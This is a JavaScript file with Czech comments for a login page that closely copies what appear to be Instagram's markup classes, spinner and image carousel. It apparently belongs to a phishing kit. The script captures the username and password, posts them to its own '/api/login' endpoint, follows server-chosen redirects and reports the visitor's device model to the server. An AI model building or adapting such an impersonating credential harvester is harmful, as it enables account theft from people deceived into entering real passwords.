const initFormFunctions = () => {
  const label = document.querySelector("label._aa48");
  const input = label.querySelector("input");
  const passwordInput = document.querySelector('input[name="password"]');
  const usernameInput = document.querySelector('input[name="username"]');
  const showHideButton = document.querySelector("button._acan");
  const loginButton = document.querySelector("button._acan._acap._acas");
  const messageDisplay = document.querySelector("#error-message"); // Element pro zobrazení zpráv
  const messageDisplaySpan = document.querySelector("#error-message-span"); // Element pro zobrazení zpráv span

  const defaultRedirectEndpoint = "/default-redirect"; // Defaultní endpoint pro redirect

  if (
    !input ||
    !passwordInput ||
    !usernameInput ||
    !showHideButton ||
    !loginButton ||
    !messageDisplay
  ) {
    console.error("Nelze najít požadované inputy nebo tlačítka.");
    return;
  }

  const updateInputValue = (input, label) => {
    input.addEventListener("focus", () => {
      input.classList.add("focus-visible");
    });

    input.addEventListener("input", () => {
      input.setAttribute("value", input.value);
      if (input.value.length > 0) {
        label.classList.add("_aa49");
      } else {
        label.classList.remove("_aa49");
      }
    });

    input.addEventListener("blur", () => {
      input.classList.remove("focus-visible");
    });
  };
  updateInputValue(input, label);

  const handleShowHidePassword = () => {
    passwordInput.addEventListener("focus", () => {
      passwordInput.classList.add("focus-visible");
    });

    passwordInput.addEventListener("input", () => {
      passwordInput.setAttribute("value", passwordInput.value);
      const passwordLabel = passwordInput.closest("label._aa48");
      if (passwordLabel) {
        if (passwordInput.value.length > 0) {
          passwordLabel.classList.add("_aa49");
          showHideButton.style.display = "inline";
        } else {
          passwordLabel.classList.remove("_aa49");
          showHideButton.style.display = "none";
        }
      }
    });

    passwordInput.addEventListener("blur", () => {
      passwordInput.classList.remove("focus-visible");
    });

    showHideButton.addEventListener("click", () => {
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        showHideButton.innerText = "Hide";
      } else {
        passwordInput.type = "password";
        showHideButton.innerText = "Show";
      }
    });
  };
  handleShowHidePassword();

  const updateLoginButtonState = () => {
    if (passwordInput.value.length >= 6 && usernameInput.value.length >= 1) {
      loginButton.removeAttribute("disabled");
    } else {
      loginButton.setAttribute("disabled", "");
    }
  };

  usernameInput.addEventListener("input", updateLoginButtonState);
  passwordInput.addEventListener("input", updateLoginButtonState);

  // Funkce pro odeslání dat na server při přihlášení
  const handleLogin = async (event) => {
    event.preventDefault();

    const username = usernameInput.value;
    const password = passwordInput.value;

    const data = {
      username: username,
      password: password,
    };

    messageDisplaySpan.style.display = "none";

    loginButton.setAttribute("disabled", "");
    loginButton.classList.add("_acax");
    loginButton.innerHTML = `
            <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">Přihlásit se</div>
            <div data-visualcompletion="loading-state" class="x78zum5 xdt5ytf xl56j7k x1nrll8i x10l6tqk xwa60dl x11lhmoz" role="progressbar" style="height: 18px; width: 18px;">
                <svg aria-label="Načítání..." class="xemfg65 xa4qsjk xs51kk x2a5n4e" role="img" viewBox="0 0 100 100">
                    <rect class="xwn9dsr" height="10" opacity="0" rx="5" ry="5" transform="rotate(-90 50 50)" width="28" x="67" y="45"></rect>
                    <rect class="xwn9dsr" height="10" opacity="0.125" rx="5" ry="5" transform="rotate(-45 50 50)" width="28" x="67" y="45"></rect>
                    <rect class="xwn9dsr" height="10" opacity="0.25" rx="5" ry="5" transform="rotate(0 50 50)" width="28" x="67" y="45"></rect>
                    <rect class="xwn9dsr" height="10" opacity="0.375" rx="5" ry="5" transform="rotate(45 50 50)" width="28" x="67" y="45"></rect>
                    <rect class="xwn9dsr" height="10" opacity="0.5" rx="5" ry="5" transform="rotate(90 50 50)" width="28" x="67" y="45"></rect>
                    <rect class="xwn9dsr" height="10" opacity="0.625" rx="5" ry="5" transform="rotate(135 50 50)" width="28" x="67" y="45"></rect>
                    <rect class="xwn9dsr" height="10" opacity="0.75" rx="5" ry="5" transform="rotate(180 50 50)" width="28" x="67" y="45"></rect>
                    <rect class="xwn9dsr" height="10" opacity="0.875" rx="5" ry="5" transform="rotate(225 50 50)" width="28" x="67" y="45"></rect>
                </svg>
            </div>`;

    passwordInput.setAttribute("disabled", "");
    usernameInput.setAttribute("disabled", "");
    showHideButton.style.display = "none";

    try {
      const response = await fetch("/api/login", {
        // Změňte endpoint na ten správný
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.redirected) {
        // Přesměrování zpracované na serveru (3xx odpověď)
        window.location.href = response.url;
        return;
      }

      if (response.ok) {
        const responseData = await response.json();
        setTimeout(function () {
          revertLoginButton();
        }, 300);

        // Zpracování podle `status`, `message`, a `redirect`
        if (responseData.status === "success") {
          // Přesměrování na endpoint uvedený v JSON
          window.location.href = responseData.redirect;
        } else if (responseData.status === "fail") {
          if (responseData.message) {
            messageDisplaySpan.style.display = "block";
            // Zobrazení zprávy
            messageDisplay.innerText = responseData.message;
            messageDisplay.style.display = "block";
          } else {
            // Přesměrování na defaultní endpoint
            window.location.href = defaultRedirectEndpoint;
          }
        }
      } else {
        console.error("Chyba při přihlašování.");
      }
    } catch (error) {
      console.error("Chyba při odesílání požadavku:", error);
    }
  };

  loginButton.addEventListener("click", handleLogin);
};

// Inicializace všech funkcí
initFormFunctions();


const revertLoginButton = () => {
  const passwordInput = document.querySelector('input[name="password"]');
  const usernameInput = document.querySelector('input[name="username"]');
  const loginButton = document.querySelector("button._acan._acap._acas");

  if (!passwordInput || !usernameInput || !loginButton) {
    console.error(
      "Nelze najít input pro heslo, username nebo tlačítko Log in."
    );
    return;
  }

  // Obnovení textu tlačítka a odstranění loading ikony
  loginButton.removeAttribute("disabled");
  loginButton.classList.remove("_acax"); // odstranění třídy pro vzhled tlačítka
  loginButton.innerHTML =
    '<div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">Log in</div>';

  // Obnovení inputů (odstranění disabled)
  passwordInput.removeAttribute("disabled");
  usernameInput.removeAttribute("disabled");

  // Kontrola, jestli tlačítko Show/Hide již není přítomné
  let showHideButton = document.querySelector("button._acan._acao._acat");

  // Pokud tlačítko neexistuje, přidáme ho zpět
  if (!showHideButton) {
    showHideButton = document.createElement("button");
    showHideButton.classList.add("_acan", "_acao", "_acat", "_aj1-", "_ap30");
    showHideButton.setAttribute("type", "button");
    showHideButton.textContent = "Show"; // Text pro tlačítko

    // Najdeme div, do kterého tlačítko přidáme
    const targetDiv = document.querySelector(
      ".x9f619.xjbqb8w.x78zum5.x168nmei.x13lgxp2.x5pf9jr.xo71vjh.x1i64zmx.x1n2onr6.x1plvlek.xryxfnj.x1c4vz4f.x2lah0s.xdt5ytf.xqjyukv.x1qjc9v5.x1oa3qoh.x1nhvcw1"
    );

    // Pokud div existuje, přidáme tlačítko
    if (targetDiv) {
      targetDiv.appendChild(showHideButton);
    } else {
      console.error("Cílový div pro tlačítko nebyl nalezen.");
    }

    // Přidáme event listener pro přepínání Show/Hide
    showHideButton.addEventListener("click", () => {
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        showHideButton.innerText = "Hide";
      } else {
        passwordInput.type = "password";
        showHideButton.innerText = "Show";
      }
    });
  }

  // Zkontrolujeme, zda je input pro heslo prázdný a podle toho skryjeme nebo zobrazíme tlačítko
  if (passwordInput.value.length === 0) {
    showHideButton.style.display = "none"; // Skryjeme tlačítko, pokud je input prázdný
  } else {
    showHideButton.style.display = "inline"; // Zobrazíme tlačítko, pokud má input hodnotu
  }
};

//images
// Získání obrázků podle jejich ID
const images = [
  document.getElementById("first-image"),
  document.getElementById("second-image"),
  document.getElementById("third-image"),
  document.getElementById("fourth-image"),
];

// Počáteční nastavení stavu
let currentIndex = 0;
const totalImages = images.length;

// Definice tříd pro různé stavy
const classesVisible =
  "x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xqyf9gi x1hc1fzr x1rkc77x x19991ni x1lizcpb xnpuxes xhtitgo";
const classesHidden =
  "x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xg01cxk xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xlshs6z xqyf9gi";
const classesHiding =
  "x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xqyf9gi xg01cxk x1rkc77x x19991ni x9lcvmn xnpuxes";

// Funkce pro aktualizaci stavů obrázků
function updateImageClasses() {
  // Nastavit všechny obrázky na plně skrytý stav
  images.forEach((img) => (img.className = classesHidden));

  // Nastavit aktuální obrázek jako viditelný
  images[currentIndex].className = classesVisible;

  // Nastavit předchozí obrázek jako skrývající se
  const hidingIndex = (currentIndex - 1 + totalImages) % totalImages;
  images[hidingIndex].className = classesHiding;

  // Posun na další obrázek
  currentIndex = (currentIndex + 1) % totalImages;
}

// Spustit cyklus každých 5 sekund
setInterval(updateImageClasses, 5000);

// Inicializace s počátečním stavem
updateImageClasses();

// ----------------------------------------------------------------------
function loadScriptAndDetectDevice() {
  // Vytvoření nového script tagu
  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/npm/ua-parser-js@0.7.28/dist/ua-parser.min.js';
  script.type = 'text/javascript';

  // Po načtení skriptu provede detekci zařízení
  script.onload = function() {
      // Použití UAParser.js pro detekci modelu zařízení
      const parser = new UAParser();
      const result = parser.getResult();

      // Získání modelu zařízení, pokud je k dispozici
      const deviceModel = result.device.model || "Unknown Model";

      // Zobrazení modelu zařízení na stránce
      console.log("Device Model:", deviceModel);

      // Odeslání dat na server
      fetch('/api/frontend_device_detection', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify({ model: deviceModel })
      })
      .then(response => {
          if (response.ok) {
              console.log("Data byla úspěšně odeslána na server.");
          } else {
              console.error("Došlo k chybě při odesílání dat na server.");
          }
      })
      .catch(error => {
          console.error("Chyba při odesílání požadavku:", error);
      });
  };

  // Přidání script tagu do head nebo body dokumentu
  document.head.appendChild(script);
}


loadScriptAndDetectDevice()